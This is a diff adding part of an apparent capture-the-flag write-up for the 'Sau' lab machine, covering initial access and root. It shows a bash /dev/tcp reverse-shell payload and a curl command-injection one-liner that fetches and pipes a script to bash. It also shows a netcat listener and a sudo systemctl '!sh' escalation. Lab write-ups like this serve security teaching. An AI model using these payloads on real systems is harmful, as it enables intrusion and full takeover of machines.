@@ -123,6 +123,68 @@ trying to access the login page from the browser gives us this response, so we'l
 
 getting a revrerse shell
 
+I created a shell.sh file with my payload in it and setup a python webserver to host it on port 80 preferably
+make sure the payload file is in the same folder you set up the webserver
+```console
+┌──(mofe㉿mofe)-[~/tools]
+└─$ cat shell.sh               
+bash -i >& /dev/tcp/10.10.14.135/4444 0>&1
+                                                                                  
+┌──(mofe㉿mofe)-[~/tools]
+└─$ sudo python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+
+```
+so we run our one liner
+```console
+ curl "http://10.10.11.224:55555/fourth" --data 'username=;` curl 10.10.14.135/shell.sh | bash` '
+```
+and immediately we get a shell, first things first we upgrade our shell
+
+```console
+┌──(mofe㉿mofe)-[~]
+└─$ nc -lvnp 4444 
+listening on [any] 4444 ...
+connect to [10.10.14.135] from (UNKNOWN) [10.10.11.224] 60034
+bash: cannot set terminal process group (890): Inappropriate ioctl for device
+bash: no job control in this shell
+puma@sau:/opt/maltrail$  python3 -c 'import pty; pty.spawn("/bin/bash")'
+ python3 -c 'import pty; pty.spawn("/bin/bash")'
+puma@sau:/opt/maltrail$ ^Z
+zsh: suspended  nc -lvnp 4444
+                                                                                  
+┌──(mofe㉿mofe)-[~]
+└─$ stty raw -echo ; fg          
+
+[1]  + continued  nc -lvnp 4444
+
+puma@sau:/opt/maltrail$ export TERM=xterm
+puma@sau:/opt/maltrail$
+```
+now we have an interactive shell .once we get initial access the road to root on sau is a piece of cake
+
+running the command sudo -l to see the commands our current user can run
+![2023-07-25_08-19](https://github.com/0xRoqeeb/writeups/assets/49154037/b0687b33-f3e4-474e-af63-901892f95980)
+we can run */usr/bin/systemctl status trail.service* as root and **NOPASSWD** means we can invoke the sudo command without a password
+so i checked gtfobins for the binary we have access too and luckily there's and entry for [systemctl](https://gtfobins.github.io/gtfobins/systemctl/)
+
+![2023-07-25_08-25_1](https://github.com/0xRoqeeb/writeups/assets/49154037/29ad70a9-90ff-4308-86ac-5a93df524b7f)
+Let's run the command ```/usr/bin/systemctl status trail.service```
+and input “!sh” to spawn a shell
+
+![2023-07-25_08-29](https://github.com/0xRoqeeb/writeups/assets/49154037/af301225-b263-45ec-94c9-b699ecb2573f) 
+and we're root:)
+
+
+
+
+
+
+
+
+
+
+
 
 
 
